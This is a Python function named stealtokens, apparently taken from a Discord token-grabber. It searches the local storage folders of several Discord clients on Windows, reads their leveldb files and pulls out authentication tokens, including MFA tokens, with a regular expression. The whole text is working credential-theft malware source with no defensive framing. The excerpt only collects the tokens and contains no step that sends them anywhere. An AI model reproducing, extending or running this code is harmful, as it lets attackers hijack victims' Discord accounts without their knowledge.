def stealtokens():
    tokens = []
    
    discord_paths = [
        os.path.join(os.environ['APPDATA'], 'discord'),
        os.path.join(os.environ['LOCALAPPDATA'], 'Discord'),
        os.path.join(os.environ['APPDATA'], 'discordcanary'),
        os.path.join(os.environ['APPDATA'], 'discordptb')
    ]
    
    for discord_path in discord_paths:
        if os.path.exists(discord_path):
            for root, dirs, files in os.walk(discord_path):
                if 'Local Storage' in root and 'leveldb' in root:
                    for file in files:
                        if file.endswith(('.ldb', '.log')):
                            try:
                                file_path = os.path.join(root, file)
                                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                    content = f.read()
                                
                                import re
                                token_pattern = r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}'
                                found_tokens = re.findall(token_pattern, content)
                                
                                for token in found_tokens:
                                    tokens.append({
                                        'source': 'Desktop',
                                        'client': os.path.basename(discord_path),
                                        'token': token,
                                        'file': file
                                    })
                            except:
                                continue
    
    return tokens
